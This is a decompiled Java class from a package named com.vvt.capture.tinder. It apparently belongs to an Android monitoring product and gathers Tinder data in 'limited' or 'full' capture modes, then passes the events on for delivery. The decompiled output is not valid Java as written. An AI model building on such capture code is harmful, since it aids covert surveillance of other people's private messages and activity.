package com.vvt.capture.tinder;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final String a = a.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private com.vvt.base.b d;
  private com.vvt.base.a e;
  private String f;
  private com.vvt.base.capture.e g;
  private f h;
  
  public a(String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, Context paramContext, com.vvt.base.b paramb1)
  {
    this.f = paramString;
    this.e = parama;
    this.d = paramb1;
    Object localObject1 = RunningMode.LIMITED_1;
    Object localObject2;
    if (paramRunningMode == localObject1)
    {
      localObject1 = new com/vvt/capture/tinder/b/a;
      localObject2 = this.d.f();
      ((com.vvt.capture.tinder.b.a)localObject1).<init>(paramb, paramString, (String)localObject2);
      this.g = ((com.vvt.base.capture.e)localObject1);
      localObject1 = new com/vvt/capture/tinder/b/b;
      localObject2 = this.d;
      ((com.vvt.capture.tinder.b.b)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
      this.h = ((f)localObject1);
    }
    for (;;)
    {
      return;
      localObject1 = RunningMode.FULL;
      if (paramRunningMode == localObject1)
      {
        localObject1 = new com/vvt/capture/tinder/a/b;
        ((com.vvt.capture.tinder.a.b)localObject1).<init>();
        this.g = ((com.vvt.base.capture.e)localObject1);
        localObject1 = new com/vvt/capture/tinder/a/e;
        localObject2 = this.d;
        ((com.vvt.capture.tinder.a.e)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
        this.h = ((f)localObject1);
      }
      else
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a(com.vvt.base.b paramb)
  {
    this.d = paramb;
    boolean bool = b;
    if (bool) {}
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = b;
    if (bool1) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = localIterator.next();
      boolean bool2 = localObject instanceof TinderData;
      if (bool2)
      {
        bool2 = b;
        if (bool2) {}
        localObject = b.a((TinderData)localObject);
        if (localObject != null)
        {
          int i = ((List)localObject).size();
          if (i > 0) {
            localArrayList.addAll((Collection)localObject);
          }
        }
      }
    }
    Object localObject = this.e;
    if (localObject != null)
    {
      bool1 = k();
      if (bool1)
      {
        bool1 = b;
        if (bool1) {}
        localObject = this.e;
        ((com.vvt.base.a)localObject).a(localArrayList);
      }
    }
  }
  
  protected com.vvt.base.capture.e b()
  {
    return this.g;
  }
  
  protected f c()
  {
    return this.h;
  }
  
  protected String d()
  {
    return a;
  }
  
  protected String e()
  {
    return this.f;
  }
  
  protected String f()
  {
    return "tinder.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/tinder/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */